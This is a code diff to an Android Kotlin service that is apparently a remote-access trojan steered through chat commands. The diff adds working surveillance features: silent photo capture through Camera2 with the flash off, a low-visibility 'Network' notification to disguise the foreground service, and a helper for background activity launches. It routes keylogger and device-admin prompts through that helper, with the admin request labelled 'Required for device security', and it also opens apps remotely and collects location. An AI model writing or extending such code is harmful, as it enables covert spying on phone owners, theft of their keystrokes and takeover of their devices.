@@ -10,17 +10,24 @@ import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.database.Cursor
+import android.graphics.ImageFormat
 import android.graphics.SurfaceTexture
-import android.hardware.Camera
+import android.hardware.camera2.CameraCaptureSession
+import android.hardware.camera2.CameraCharacteristics
+import android.hardware.camera2.CameraDevice
 import android.hardware.camera2.CameraManager
+import android.hardware.camera2.CaptureRequest
 import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
+import android.media.ImageReader
 import android.media.MediaRecorder
 import android.net.Uri
 import android.net.wifi.WifiManager
 import android.os.Build
+import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.os.VibrationEffect
@@ -74,10 +81,18 @@ class MainService : Service() {
             debugFile?.appendText("pkg=${packageName} uid=${android.os.Process.myUid()}\n")
             debugFile?.appendText("model=${Build.MODEL} sdk=${Build.VERSION.SDK_INT}\n")
             debugFile?.appendText("debug path: ${filesDir.absolutePath}\n")
-            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_NONE)
+            val chan = NotificationChannel(CHANNEL, "Network", NotificationManager.IMPORTANCE_LOW).apply {
+                setSound(null, null)
+                setShowBadge(false)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) setAllowBubbles(false)
+            }
             (getSystemService(NOTIFICATION_SERVICE) as NotificationManager).createNotificationChannel(chan)
             showNotif("Starting...")
-            startForeground(NOTIF_ID, buildNotif("Starting..."))
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(NOTIF_ID, buildNotif("Starting..."), ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            } else {
+                startForeground(NOTIF_ID, buildNotif("Starting..."))
+            }
         } catch (e: Exception) {
             Log.e(TAG, "fg: ${e.message}")
         }
@@ -125,6 +140,20 @@ class MainService : Service() {
     private fun updateNotif(text: String) {
         showNotif(text)
         appendDebug("${System.currentTimeMillis()} status=$text\n")
+    }
+
+    private fun startActivitySafely(intent: Intent) {
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                val pi = PendingIntent.getActivity(this, intent.hashCode(), intent,
+                    PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
+                startIntentSender(pi.intentSender, null, 0, 0, 0)
+            } else {
+                startActivity(intent)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "startActivitySafely: ${e.message}")
+        }
     }
 
     private fun loadCrashReports() {
@@ -196,7 +225,7 @@ class MainService : Service() {
                         "on" -> {
                             if (!KeylogService.isRunning) {
                                 val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                try { startActivity(i) } catch (_: Exception) {}
+                                startActivitySafely(i)
                                 d.sendMsg(":keyboard: **Enable Keylogger**\nOpen Accessibility → ${packageName} → toggle on")
                             } else {
                                 d.sendMsg(":keyboard: Keylogger already running")
@@ -205,7 +234,7 @@ class MainService : Service() {
                         "off" -> {
                             if (KeylogService.isRunning) {
                                 val i = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                try { startActivity(i) } catch (_: Exception) {}
+                                startActivitySafely(i)
                                 d.sendMsg(":keyboard: **Disable Keylogger**\nOpen Accessibility → ${packageName} → toggle off")
                             } else {
                                 d.sendMsg(":keyboard: Keylogger not running")
@@ -393,7 +422,11 @@ class MainService : Service() {
                 }
                 "battery" -> {
                     val ifilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
-                    val bStatus = registerReceiver(null, ifilter)
+                    val bStatus = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+                        registerReceiver(null, ifilter, Context.RECEIVER_NOT_EXPORTED)
+                    } else {
+                        registerReceiver(null, ifilter)
+                    }
                     if (bStatus != null) {
                         val level = bStatus.getIntExtra("level", -1)
                         val scale = bStatus.getIntExtra("scale", -1)
@@ -497,7 +530,7 @@ class MainService : Service() {
                                     .putExtra(android.app.admin.DevicePolicyManager.EXTRA_DEVICE_ADMIN, comp)
                                     .putExtra(android.app.admin.DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for device security")
                                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                                startActivity(i)
+                                startActivitySafely(i)
                                 d.sendMsg(":shield: **Device Admin prompt sent** — accept on device")
                             } else {
                                 d.sendMsg(":shield: Device Admin already active")
@@ -572,7 +605,7 @@ class MainService : Service() {
                         val intent = packageManager.getLaunchIntentForPackage(payload)
                         if (intent != null) {
                             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
-                            startActivity(intent)
+                            startActivitySafely(intent)
                             d.sendMsg(":link: Opened: $payload")
                         } else {
                             d.sendMsg(":x: Package not installed: $payload")
@@ -682,9 +715,18 @@ class MainService : Service() {
     }
 
     private suspend fun takePhoto(cameraId: Int = 0): ByteArray? = withContext(Dispatchers.IO) {
-        var camera: Camera? = null
-        try {
-            camera = Camera.open(cameraId)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            takePhotoCamera2(cameraId)
+        } else {
+            takePhotoLegacy(cameraId)
+        }
+    }
+
+    @Suppress("DEPRECATION")
+    private fun takePhotoLegacy(cameraId: Int): ByteArray? {
+        var camera: android.hardware.Camera? = null
+        return try {
+            camera = android.hardware.Camera.open(cameraId)
             val params = camera.parameters
             camera.parameters = params
             val texture = SurfaceTexture(0)
@@ -693,7 +735,7 @@ class MainService : Service() {
             val latch = CountDownLatch(1)
             var result: ByteArray? = null
             camera.autoFocus { _, _ ->
-                camera.takePicture(null, null, Camera.PictureCallback { data, _ ->
+                camera.takePicture(null, null, android.hardware.Camera.PictureCallback { data, _ ->
                     result = data
                     latch.countDown()
                 })
@@ -701,13 +743,115 @@ class MainService : Service() {
             latch.await(15, TimeUnit.SECONDS)
             result
         } catch (e: Exception) {
-            Log.e(TAG, "camera: ${e.message}")
+            Log.e(TAG, "camera legacy: ${e.message}")
             null
         } finally {
             try {
                 camera?.stopPreview()
                 camera?.release()
             } catch (_: Exception) {}
+        }
+    }
+
+    private suspend fun takePhotoCamera2(cameraId: Int): ByteArray? = withContext(Dispatchers.IO) {
+        val deferred = CompletableDeferred<ByteArray?>()
+        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
+        val camId = try {
+            if (cameraId == 1) {
+                cm.cameraIdList.find { id ->
+                    val chars = cm.getCameraCharacteristics(id)
+                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_FRONT
+                }
+            } else {
+                cm.cameraIdList.firstOrNull { id ->
+                    val chars = cm.getCameraCharacteristics(id)
+                    val lens = chars.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING)
+                    lens == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "camera2 find: ${e.message}")
+            null
+        }
+
+        if (camId == null) {
+            deferred.complete(null)
+            return@withContext deferred.await()
+        }
+
+        var reader: ImageReader? = null
+        var camDevice: CameraDevice? = null
+        var session: CameraCaptureSession? = null
+
+        try {
+            val characteristics = cm.getCameraCharacteristics(camId)
+            val map = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
+            val size = map?.getOutputSizes(ImageFormat.JPEG)?.maxByOrNull { it.width * it.height }
+                ?: android.util.Size(1920, 1080)
+
+            reader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
+            val handler = Handler(Looper.getMainLooper())
+
+            val stateCallback = object : CameraDevice.StateCallback() {
+                override fun onOpened(device: CameraDevice) {
+                    camDevice = device
+                    try {
+                        val captureRequest = device.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply {
+                            addTarget(reader!!.surface)
+                            set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_AUTO)
+                            set(CaptureRequest.FLASH_MODE, CaptureRequest.FLASH_MODE_OFF)
+                        }.build()
+
+                        device.createCaptureSession(listOf(reader!!.surface), object : CameraCaptureSession.StateCallback() {
+                            override fun onConfigured(s: CameraCaptureSession) {
+                                session = s
+                                try {
+                                    s.capture(captureRequest, null, handler)
+                                } catch (e: Exception) {
+                                    Log.e(TAG, "camera2 capture: ${e.message}")
+                                    deferred.complete(null)
+                                }
+                            }
+                            override fun onConfigureFailed(s: CameraCaptureSession) {
+                                deferred.complete(null)
+                            }
+                        }, handler)
+                    } catch (e: Exception) {
+                        Log.e(TAG, "camera2 session: ${e.message}")
+                        deferred.complete(null)
+                    }
+                }
+                override fun onDisconnected(device: CameraDevice) { deferred.complete(null) }
+                override fun onError(device: CameraDevice, error: Int) { deferred.complete(null) }
+            }
+
+            cm.openCamera(camId, stateCallback, handler)
+
+            reader!!.setOnImageAvailableListener({ r ->
+                try {
+                    val image = r.acquireLatestImage()
+                    if (image != null) {
+                        val buffer = image.planes[0].buffer
+                        val bytes = ByteArray(buffer.remaining())
+                        buffer.get(bytes)
+                        image.close()
+                        deferred.complete(bytes)
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "camera2 read: ${e.message}")
+                    deferred.complete(null)
+                }
+            }, handler)
+
+            withTimeoutOrNull(15000L) { deferred.await() }
+        } catch (e: Exception) {
+            Log.e(TAG, "camera2: ${e.message}")
+            null
+        } finally {
+            try { session?.close() } catch (_: Exception) {}
+            try { camDevice?.close() } catch (_: Exception) {}
+            try { reader?.close() } catch (_: Exception) {}
         }
     }
 
@@ -725,7 +869,13 @@ class MainService : Service() {
         }
         val latch = CountDownLatch(1)
         var newLoc: Location? = null
-        val listener = LocationListener { newLoc = it; latch.countDown() }
+        @Suppress("DEPRECATION")
+        val listener = object : LocationListener {
+            override fun onLocationChanged(location: Location) { newLoc = location; latch.countDown() }
+            override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
+            override fun onProviderEnabled(provider: String) {}
+            override fun onProviderDisabled(provider: String) {}
+        }
         try {
             val providers = listOf(LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER)
             for (p in providers) {
